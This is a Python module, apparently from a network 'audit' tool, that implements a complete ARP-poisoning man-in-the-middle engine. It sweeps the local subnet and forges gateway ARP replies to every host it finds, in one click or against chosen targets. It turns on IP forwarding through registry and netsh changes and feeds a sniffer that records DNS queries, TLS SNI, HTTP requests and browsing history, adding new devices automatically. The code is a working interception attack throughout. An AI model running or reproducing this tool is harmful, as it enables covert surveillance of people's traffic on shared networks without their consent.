"""
ARP Spoofer / MITM Engine - Active network interception (Half-Duplex).

Redirects OUTBOUND traffic from target devices through the audit PC by
sending crafted ARP replies (target-only poisoning). The gateway is NOT
poisoned, so return traffic flows directly to targets - this prevents
connectivity disruption while still capturing all audit-relevant data
(DNS queries, TLS SNI, HTTP requests, browsing history).

Safety:
- atexit handler restores ARP tables on crash/exit
- stop() sends 5x gratuitous ARP corrections per target
- IP forwarding is disabled on stop
"""

from __future__ import annotations

import atexit
import ipaddress
import os
import platform
import subprocess
import threading
import time
from typing import Optional

_INSTANCE = None  # Singleton for atexit cleanup


class ArpSpoofer:
    """Active ARP spoofing engine for traffic interception."""

    def __init__(self):
        global _INSTANCE
        _INSTANCE = self

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

        # Network context
        self._interface: str = ""
        self._local_ip: str = ""
        self._local_mac: str = ""
        self._gateway_ip: str = ""
        self._gateway_mac: str = ""

        # Targets being spoofed
        self._targets: dict[str, str] = {}  # IP -> MAC
        self._discovered_hosts: list[dict] = []  # From ARP scan

        # Stats
        self._start_time: float = 0.0
        self._packets_sent: int = 0
        self._forwarding_was_enabled: bool = False
        self._interface_index: int = 0  # Windows interface index for scoped forwarding

        # Sniffer integration
        self._sniffer = None  # Reference to PassiveSniffer for auto-start & tagging
        self._auto_refresh_interval: int = 45  # Re-scan for new devices every N seconds
        self._last_refresh: float = 0.0

        # Register atexit cleanup
        atexit.register(_atexit_cleanup)

    @property
    def is_running(self) -> bool:
        return self._running

    def set_sniffer(self, sniffer) -> None:
        """Set reference to passive sniffer for auto-start and tagging."""
        self._sniffer = sniffer

    def get_status(self) -> dict:
        """Get current MITM status."""
        with self._lock:
            return {
                "is_running": self._running,
                "interface": self._interface,
                "local_ip": self._local_ip,
                "local_mac": self._local_mac,
                "gateway_ip": self._gateway_ip,
                "gateway_mac": self._gateway_mac,
                "targets": [
                    {"ip": ip, "mac": mac} for ip, mac in self._targets.items()
                ],
                "target_count": len(self._targets),
                "packets_sent": self._packets_sent,
                "duration": time.time() - self._start_time if self._start_time and self._running else 0,
                "discovered_hosts": self._discovered_hosts,
            }

    def scan_network(self, interface: str = "") -> list[dict]:
        """
        ARP scan the local subnet to discover all live devices.
        Returns list of {ip, mac, hostname} dicts.
        """
        try:
            from scapy.all import ARP, Ether, srp, conf, get_if_addr, get_if_hwaddr
            conf.verb = 0

            # Detect interface details
            if interface:
                local_ip = get_if_addr(interface)
                local_mac = get_if_hwaddr(interface)
            else:
                from network.interfaces import get_best_interface
                best = get_best_interface()
                if not best:
                    return []
                interface = best.name
                local_ip = best.ip
                local_mac = best.mac

            if not local_ip:
                return []

            # Store for later use
            self._interface = interface
            self._local_ip = local_ip
            self._local_mac = local_mac

            # Detect gateway
            self._gateway_ip = self._detect_gateway()

            # Build subnet CIDR for scanning
            # Assume /24 if we can't determine
            try:
                import psutil
                for name, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == 2 and addr.address == local_ip:  # AF_INET
                            netmask = addr.netmask
                            if netmask:
                                net = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
                                subnet_cidr = str(net)
                                break
                else:
                    subnet_cidr = f"{local_ip}/24"
            except Exception:
                subnet_cidr = f"{local_ip}/24"

            print(f"[ARP-Scan] Scanning {subnet_cidr} on '{interface}'...")

            # Send ARP who-has for every IP in subnet
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet_cidr)
            answered, _ = srp(arp_request, iface=interface, timeout=3, retry=1)

            hosts = []
            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc.upper()

                # Skip our own IP
                if ip == local_ip:
                    continue

                # Try reverse DNS for hostname
                hostname = ""
                try:
                    import socket
                    hostname = socket.getfqdn(ip)
                    if hostname == ip:
                        hostname = ""
                except Exception:
                    pass

                is_gateway = (ip == self._gateway_ip)

                hosts.append({
                    "ip": ip,
                    "mac": mac,
                    "hostname": hostname,
                    "is_gateway": is_gateway,
                })

            # Also resolve gateway MAC if found
            for h in hosts:
                if h["ip"] == self._gateway_ip:
                    self._gateway_mac = h["mac"]
                    break

            # If gateway not in scan results, ARP it directly
            if self._gateway_ip and not self._gateway_mac:
                import ipaddress
                try:
                    # Validate gateway IP is actually a valid IP address string before trying to ARP it
                    ipaddress.IPv4Address(self._gateway_ip)
                    arp_gw = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self._gateway_ip)
                    ans, _ = srp(arp_gw, iface=interface, timeout=2, retry=1, verbose=False)
                    if ans:
                        self._gateway_mac = ans[0][1].hwsrc.upper()
                        # Add gateway to list if not present
                        if not any(h["ip"] == self._gateway_ip for h in hosts):
                            hosts.insert(0, {
                                "ip": self._gateway_ip,
                                "mac": self._gateway_mac,
                                "hostname": "Gateway/Router",
                                "is_gateway": True,
                            })
                except Exception as e:
                    print(f"[MITM] Warning: Failed to ARP gateway IP {self._gateway_ip}: {e}")

            # Sort: gateway first, then by IP
            hosts.sort(key=lambda h: (not h.get("is_gateway", False), h["ip"]))

            with self._lock:
                self._discovered_hosts = hosts

            print(f"[ARP-Scan] Found {len(hosts)} live hosts (gateway: {self._gateway_ip} / {self._gateway_mac})")
            return hosts

        except Exception as e:
            print(f"[ARP-Scan] Error: {e}")
            import traceback
            traceback.print_exc()
            return []

    def start_all(self, interface: str = "") -> dict:
        """
        One-click intercept ALL devices on the subnet.
        Scans the network, selects all non-gateway hosts, and starts spoofing.
        Also auto-starts the sniffer if not already running.
        """
        if self._running:
            return {"error": "MITM is already running"}

        # Step 1: Scan the subnet
        hosts = self.scan_network(interface=interface)
        if not hosts:
            return {"error": "No devices found on subnet. Ensure admin privileges."}

        # Step 2: Select all non-gateway hosts
        target_ips = [h["ip"] for h in hosts if not h.get("is_gateway", False)]
        if not target_ips:
            return {"error": "No targetable devices found (only gateway visible)"}

        # Step 3: Auto-start sniffer if available and not running
        if self._sniffer and not self._sniffer.is_running:
            try:
                iface = interface or self._interface
                self._sniffer.start(interface=iface)
                print(f"[MITM] Auto-started passive sniffer on '{iface}'")
            except Exception as e:
                print(f"[MITM] Warning: could not auto-start sniffer ({e})")

        # Step 4: Start spoofing
        result = self.start(target_ips=target_ips, interface=interface)
        if "error" not in result:
            result["auto_started"] = True
            result["total_hosts_found"] = len(hosts)
        return result

    def start(self, target_ips: list[str], gateway_ip: str = "", interface: str = "") -> dict:
        """
        Start ARP spoofing against specified target IPs.
        
        Args:
            target_ips: List of IPs to intercept (must NOT include gateway)
            gateway_ip: Gateway/router IP (auto-detected if empty)
            interface: Network interface (uses last scanned if empty)
        """
        if self._running:
            return {"error": "MITM is already running"}

        if not target_ips:
            return {"error": "No targets specified"}

        from scapy.all import conf
        conf.verb = 0

        # Use stored values from scan, or detect
        if interface:
            self._interface = interface
        if gateway_ip:
            self._gateway_ip = gateway_ip
        if not self._gateway_ip:
            self._gateway_ip = self._detect_gateway()

        if not self._gateway_ip:
            return {"error": "Could not detect gateway IP"}
            
        if not self._gateway_mac and self._gateway_ip:
            self._gateway_mac = self._resolve_mac(self._gateway_ip)
            
        if not self._gateway_mac:
            return {"error": "Could not resolve gateway MAC. Run 'Scan Network' first."}
        if not self._local_mac:
            return {"error": "Could not detect local MAC. Run 'Scan Network' first."}

        # Resolve target MACs from discovered hosts
        self._targets = {}
        for tip in target_ips:
            tip = tip.strip()
            if tip == self._gateway_ip or tip == self._local_ip:
                continue  # Never spoof gateway or self as a target

            # Find MAC from discovered hosts
            mac = ""
            for h in self._discovered_hosts:
                if h["ip"] == tip:
                    mac = h["mac"]
                    break

            if not mac:
                # Try ARP resolution
                mac = self._resolve_mac(tip)

            if mac:
                self._targets[tip] = mac
            else:
                print(f"[MITM] Warning: could not resolve MAC for {tip}, skipping")

        if not self._targets:
            return {"error": "Could not resolve MAC for any target"}

        # Enable IP forwarding
        self._enable_ip_forwarding()

        # Start spoofing thread
        self._running = True
        self._start_time = time.time()
        self._packets_sent = 0

        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()

        target_list = ", ".join(self._targets.keys())
        print(f"[MITM] STARTED - Spoofing {len(self._targets)} targets: {target_list}")
        print(f"[MITM] Gateway: {self._gateway_ip} ({self._gateway_mac})")

        return self.get_status()

    def stop(self) -> dict:
        """Stop ARP spoofing and restore the network."""
        if not self._running:
            return {"error": "MITM is not running"}

        self._running = False

        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

        # Restore ARP tables
        self._restore_arp()

        # Disable IP forwarding
        self._disable_ip_forwarding()

        target_count = len(self._targets)
        result = self.get_status()
        
        self._targets = {}
        
        # Clear the sniffer's intercepted IPs state
        if self._sniffer:
            self._sniffer.set_intercepted_ips(set())

        print(f"[MITM] STOPPED - ARP tables restored for {target_count} targets")
        return result

    def _get_spoof_interval(self, target_count: int) -> float:
        """Adaptive ARP send interval based on target count to prevent Wi-Fi congestion.
        Devices typically hold ARP cache for 30-60 seconds. We can relax the interval
        to drastically reduce broadcast noise on half-duplex Wi-Fi.
        """
        if target_count <= 5:
            return 10.0
        elif target_count <= 15:
            return 12.0
        else:
            return 15.0

    def _spoof_loop(self) -> None:
        """Background thread: continuously send spoofed ARP replies."""
        s = None
        try:
            from scapy.all import ARP, Ether, conf

            # Open a persistent L2 socket to avoid the massive overhead
            # of opening and closing a socket on every sendp call.
            s = conf.L2socket(iface=self._interface)

            self._last_refresh = time.time()
            last_passive_check = time.time()

            while self._running:
                with self._lock:
                    targets = dict(self._targets)

                target_count = len(targets)

                # Notify sniffer of currently intercepted IPs
                if self._sniffer:
                    try:
                        self._sniffer.set_intercepted_ips(set(targets.keys()))
                    except Exception:
                        pass

                # Adaptive micro-sleep: tighter for few targets, more spread for many
                micro_sleep = max(0.005, 0.05 / max(target_count, 1))

                for target_ip, target_mac in targets.items():
                    if not self._running:
                        break

                    try:
                        # Half-Duplex: ONLY poison the TARGET's ARP cache.
                        # Tell the TARGET: "Gateway IP is at MY MAC"
                        # This makes the target send outbound traffic to us.
                        # The GATEWAY is NOT poisoned - return traffic goes
                        # directly to the target, so connectivity is preserved.
                        pkt_to_target = Ether(dst=target_mac) / ARP(
                            op=2,  # ARP Reply
                            psrc=self._gateway_ip,    # "I am the gateway"
                            hwsrc=self._local_mac,     # "My MAC is ..."
                            pdst=target_ip,            # Addressed to target
                            hwdst=target_mac,
                        )

                        s.send(pkt_to_target)

                        with self._lock:
                            self._packets_sent += 1

                        # Adaptive micro-sleep between targets to prevent Wi-Fi channel burst congestion
                        time.sleep(micro_sleep)

                    except Exception as e:
                        print(f"[MITM] Spoof error for {target_ip}: {e}")

                # Passive device discovery: check sniffer traffic for new local IPs
                now = time.time()
                if now - last_passive_check > 15 and self._sniffer:
                    self._passive_discover_new_targets()
                    last_passive_check = now

                # Auto-refresh: periodically ARP scan for new devices
                if now - self._last_refresh > self._auto_refresh_interval:
                    self._refresh_targets()
                    self._last_refresh = now

                # Adaptive interval to maintain poisoned state without overwhelming the network
                interval = self._get_spoof_interval(target_count)
                steps = int(interval / 0.1)
                for _ in range(steps):
                    if not self._running:
                        break
                    time.sleep(0.1)

        except Exception as e:
            print(f"[MITM] Spoof loop error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            self._running = False
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
            # Clear intercepted IPs in sniffer
            if self._sniffer:
                try:
                    self._sniffer.set_intercepted_ips(set())
                except Exception:
                    pass

    def _passive_discover_new_targets(self) -> None:
        """Check sniffer traffic data for new local LAN IPs not yet in targets."""
        try:
            if not self._sniffer:
                return

            # Get unique hosts seen by the sniffer
            sniffer_hosts = set()
            try:
                sniffer_hosts = set(self._sniffer._unique_hosts)
            except Exception:
                return

            new_count = 0
            with self._lock:
                for ip in sniffer_hosts:
                    if not ip or ip == self._local_ip or ip == self._gateway_ip:
                        continue
                    if ip in self._targets:
                        continue
                    if len(self._targets) >= 50:
                        break

                    # Only consider private IPs
                    try:
                        ip_obj = ipaddress.IPv4Address(ip)
                        if not ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_multicast:
                            continue
                    except Exception:
                        continue

                    # Try to get MAC from sniffer's ip_to_mac mapping
                    mac = ""
                    try:
                        mac = self._sniffer._ip_to_mac.get(ip, "")
                    except Exception:
                        pass

                    if not mac:
                        # Check discovered hosts
                        for h in self._discovered_hosts:
                            if h["ip"] == ip:
                                mac = h["mac"]
                                break

                    if not mac:
                        # Quick ARP resolve (outside lock would be better, but keep it simple)
                        continue  # Will be picked up by _refresh_targets broadcast

                    self._targets[ip] = mac
                    new_count += 1

                    # Also add to discovered hosts
                    if not any(h["ip"] == ip for h in self._discovered_hosts):
                        self._discovered_hosts.append({
                            "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
                        })

            if new_count > 0:
                print(f"[MITM] Passive discovery: added {new_count} new device(s) from sniffer traffic")

        except Exception as e:
            print(f"[MITM] Passive discovery error: {e}")

    def _refresh_targets(self) -> None:
        """Re-scan the subnet and add newly discovered devices."""
        try:
            from scapy.all import ARP, Ether, srp, conf
            conf.verb = 0

            if not self._interface or not self._local_ip:
                return

            # Build subnet CIDR
            subnet_cidr = f"{self._local_ip}/24"
            try:
                import psutil
                for name, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == 2 and addr.address == self._local_ip:
                            if addr.netmask:
                                net = ipaddress.IPv4Network(f"{self._local_ip}/{addr.netmask}", strict=False)
                                subnet_cidr = str(net)
                                break
            except Exception:
                pass

            # Lighter scan: reduced timeout, no retries
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet_cidr)
            answered, _ = srp(arp_request, iface=self._interface, timeout=1, retry=0, verbose=False)

            new_count = 0
            with self._lock:
                for sent, received in answered:
                    ip = received.psrc
                    mac = received.hwsrc.upper()

                    # Skip: self, gateway
                    if ip == self._local_ip or ip == self._gateway_ip:
                        continue

                    # Update discovered hosts list
                    if not any(h["ip"] == ip for h in self._discovered_hosts):
                        self._discovered_hosts.append({
                            "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
                        })

                    # Add to active interception (cap at 50 devices)
                    if ip not in self._targets and len(self._targets) < 50:
                        self._targets[ip] = mac
                        new_count += 1
                    elif ip in self._targets:
                        # Update MAC if it changed (device got new DHCP lease)
                        if self._targets[ip] != mac:
                            self._targets[ip] = mac

            if new_count > 0:
                print(f"[MITM] Auto-refresh: added {new_count} new device(s) to interception")

        except Exception as e:
            print(f"[MITM] Auto-refresh error: {e}")

    def _restore_arp(self) -> None:
        """Send correct ARP replies to restore all poisoned target entries.
        
        Half-duplex: only targets were poisoned, so only targets need
        restoration. The gateway was never touched.
        """
        try:
            from scapy.all import ARP, Ether, sendp

            print("[MITM] Restoring target ARP tables...")

            for target_ip, target_mac in self._targets.items():
                # Send 5 corrections to ensure restoration
                for _ in range(5):
                    try:
                        # Tell the TARGET: "Gateway IP is at GATEWAY's real MAC"
                        restore_target = Ether(dst=target_mac) / ARP(
                            op=2,
                            psrc=self._gateway_ip,
                            hwsrc=self._gateway_mac,  # Real gateway MAC
                            pdst=target_ip,
                            hwdst=target_mac,
                        )

                        sendp(restore_target, iface=self._interface, verbose=False)
                    except Exception:
                        pass
                    time.sleep(0.2)

            print("[MITM] Target ARP tables restored successfully")

        except Exception as e:
            print(f"[MITM] ARP restore error: {e}")

    def _get_interface_index(self) -> int:
        """Get the Windows interface index for the active interface."""
        try:
            if self._local_ip:
                result = subprocess.run(
                    ["powershell", "-Command",
                     f"(Get-NetIPAddress -IPAddress '{self._local_ip}' -ErrorAction SilentlyContinue).InterfaceIndex"],
                    capture_output=True, text=True, timeout=10,
                )
                idx = result.stdout.strip()
                if idx and idx.isdigit():
                    return int(idx)
        except Exception:
            pass
        return 0

    def _enable_ip_forwarding(self) -> None:
        """Enable IP forwarding scoped to the audit interface only."""
        try:
            if platform.system() != "Windows":
                # Linux
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    self._forwarding_was_enabled = f.read().strip() == "1"
                if not self._forwarding_was_enabled:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                        f.write("1")
                print("[MITM] IP forwarding enabled (Linux)")
                return

            # Windows - get interface index for scoped forwarding
            self._interface_index = self._get_interface_index()

            # Check current forwarding state on the specific interface
            self._forwarding_was_enabled = False
            if self._interface_index:
                result = subprocess.run(
                    ["netsh", "interface", "ipv4", "show", "interface", str(self._interface_index)],
                    capture_output=True, text=True, timeout=10,
                )
                self._forwarding_was_enabled = "forwarding" in result.stdout.lower() and "enabled" in result.stdout.lower()

            # Enable IP routing in registry (needed for Windows to forward at all)
            subprocess.run(
                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouting", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=10,
            )
            # Suppress ICMP redirects - prevents Windows from flooding targets with
            # redirect packets when forwarding across the same adapter interface.
            subprocess.run(
                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=10,
            )

            # Enable forwarding ONLY on the specific audit interface (not globally)
            if self._interface_index:
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     str(self._interface_index), "forwarding=enabled"],
                    capture_output=True, timeout=10,
                )
                # Also suppress ICMP redirects on this interface
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     str(self._interface_index), "icmpredirects=disabled"],
                    capture_output=True, timeout=10,
                )
                print(f"[MITM] IP forwarding enabled on interface #{self._interface_index} only, ICMP redirects suppressed")
            else:
                # Fallback to global if we couldn't detect the interface index
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
                    capture_output=True, timeout=10,
                )
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=disabled"],
                    capture_output=True, timeout=10,
                )
                print("[MITM] IP forwarding enabled globally (fallback), ICMP redirects suppressed")

        except Exception as e:
            print(f"[MITM] Warning: could not enable IP forwarding ({e})")

    def _disable_ip_forwarding(self) -> None:
        """Disable IP forwarding and restore default routing settings."""
        if self._forwarding_was_enabled:
            print("[MITM] IP forwarding was already enabled before MITM, leaving as-is")
            return

        try:
            if platform.system() != "Windows":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
                print("[MITM] IP forwarding disabled (Linux)")
                return

            # Restore registry
            subprocess.run(
                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouting", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=10,
            )
            subprocess.run(
                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=10,
            )

            # Disable forwarding on the specific interface we enabled it on
            if self._interface_index:
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     str(self._interface_index), "forwarding=disabled"],
                    capture_output=True, timeout=10,
                )
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     str(self._interface_index), "icmpredirects=enabled"],
                    capture_output=True, timeout=10,
                )
                print(f"[MITM] IP forwarding disabled on interface #{self._interface_index}")
            else:
                # Fallback to global
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
                    capture_output=True, timeout=10,
                )
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=enabled"],
                    capture_output=True, timeout=10,
                )
                print("[MITM] IP forwarding disabled globally")

        except Exception as e:
            print(f"[MITM] Warning: could not disable IP forwarding ({e})")

    def _detect_gateway(self) -> str:
        """Detect the default gateway IP."""
        try:
            if platform.system() == "Windows":
                # Find the route associated with our local IP's interface
                if self._local_ip:
                    cmd = f"""
                    $ifIndex = (Get-NetIPAddress -IPAddress '{self._local_ip}' -ErrorAction SilentlyContinue).InterfaceIndex;
                    if ($ifIndex) {{
                        (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue | Sort-Object RouteMetric | Select-Object -First 1).NextHop
                    }}
                    """
                    result = subprocess.run(
                        ["powershell", "-Command", cmd],
                        capture_output=True, text=True, timeout=10,
                    )
                    gw = result.stdout.strip()
                    if gw and gw != "0.0.0.0" and gw != "25.255.255.254":
                        return gw

                # Fallback if specific local IP matching fails
                result = subprocess.run(
                    ["powershell", "-Command",
                     "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Where-Object NextHop -ne '25.255.255.254' | Sort-Object RouteMetric | Select-Object -First 1).NextHop"],
                    capture_output=True, text=True, timeout=10,
                )
                gw = result.stdout.strip()
                if gw and gw != "0.0.0.0":
                    return gw

            # Fallback: parse route table
            import re
            result = subprocess.run(
                ["route", "print", "0.0.0.0"],
                capture_output=True, text=True, timeout=10,
            )
            for line in result.stdout.split("\n"):
                if "0.0.0.0" in line:
                    parts = line.split()
                    for part in parts:
                        try:
                            ip = ipaddress.IPv4Address(part)
                            ip_str = str(ip)
                            if ip_str != "0.0.0.0" and ip_str != "255.255.255.255" and ip_str != "25.255.255.254":
                                return ip_str
                        except Exception:
                            continue

        except Exception as e:
            print(f"[MITM] Gateway detection error: {e}")

        # Last resort: common defaults
        if self._local_ip:
            parts = self._local_ip.rsplit(".", 1)
            if len(parts) == 2:
                return f"{parts[0]}.1"
        return ""

    def _resolve_mac(self, ip: str) -> str:
        """Resolve an IP to a MAC address via ARP."""
        try:
            from scapy.all import ARP, Ether, srp
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, iface=self._interface, timeout=2, retry=1, verbose=False)
            if ans:
                return ans[0][1].hwsrc.upper()
        except Exception:
            pass
        return ""


def _atexit_cleanup():
    """Emergency ARP restoration on process exit."""
    global _INSTANCE
    if _INSTANCE and _INSTANCE._running:
        print("[MITM] Emergency cleanup - restoring ARP tables...")
        _INSTANCE._running = False
        _INSTANCE._restore_arp()
        _INSTANCE._disable_ip_forwarding()
